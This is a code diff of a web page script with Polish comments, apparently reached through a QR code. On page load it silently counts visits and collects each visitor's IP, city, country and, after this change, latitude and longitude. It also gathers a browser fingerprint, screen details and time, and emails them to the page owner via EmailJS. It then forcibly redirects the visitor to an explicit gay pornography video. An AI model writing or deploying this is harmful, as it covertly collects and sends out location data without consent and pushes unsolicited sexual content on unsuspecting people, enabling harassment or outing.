@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
 (function(){
-    emailjs.init("OCRNTDmp9goCkBZx7"); // Twój Public Key
+    emailjs.init("OCRNTDmp9goCkBZx7"); 
 })();
 </script>
 
@@ -20,9 +20,15 @@
 async function runTracker(){
 
     let visitNumber = 0;
-    let ipData = { ip: "unknown", city: "unknown", country_name: "unknown" };
+let ipData = { 
+    ip: "unknown", 
+    city: "unknown", 
+    country_name: "unknown", 
+    latitude: "unknown",   
+    longitude: "unknown"   
+};
 
-    // 1️⃣ Globalny licznik
+
     try {
         let counterData = await fetch("https://api.countapi.xyz/hit/nudepublic_qrcode/visits")
             .then(r=>r.json());
@@ -31,7 +37,7 @@ async function runTracker(){
         console.log("CountAPI error:", e);
     }
 
-    // 2️⃣ GEO IP
+
     try {
         ipData = await fetch("https://ipapi.co/json/")
             .then(r=>r.json());
@@ -39,7 +45,7 @@ async function runTracker(){
         console.log("IPAPI error:", e);
     }
 
-    // 3️⃣ Prosty fingerprint
+
     let fingerprint = btoa(
         navigator.userAgent +
         navigator.language +
@@ -48,32 +54,32 @@ async function runTracker(){
         navigator.platform
     );
 
-    // 4️⃣ Wykrycie bota
+
     let bot = /bot|crawler|spider|crawling/i.test(navigator.userAgent);
 
-    // 5️⃣ Przygotowanie raportu
-    let report = {
-        visit_number: visitNumber,
-        ip: ipData.ip,
-        city: ipData.city,
-        country: ipData.country_name,
-        browser: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: screen.width + "x" + screen.height,
-        color_depth: screen.colorDepth,
-        bot: bot,
-        fingerprint: fingerprint,
-        url: window.location.href,
-        time: new Date().toLocaleString()
-    };
 
-    // 6️⃣ Wysłanie maila
+let report = {
+    visit_number: visitNumber,
+    ip: ipData.ip,
+    city: ipData.city,
+    country: ipData.country_name,
+    latitude: ipData.latitude,    // <-- dopisane
+    longitude: ipData.longitude,  // <-- dopisane
+    browser: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    color_depth: screen.colorDepth,
+    bot: bot,
+    fingerprint: fingerprint,
+    url: window.location.href,
+    time: new Date().toLocaleString()
+};
+
     emailjs.send("service_ih1p04n", "template_pvl7hkh", report)
         .then(()=> console.log("Email wysłany"))
         .catch(e=> console.log("Email error:", e));
-
-    // 7️⃣ Automatyczne przekierowanie (zawsze wykona)
+ 
     setTimeout(()=>{
         window.location.href = "https://www.gayporntube.com/video/2003987/gay-risky-cum-in-the-lake-at-night"; // <-- Wstaw docelowy URL
     },1500);
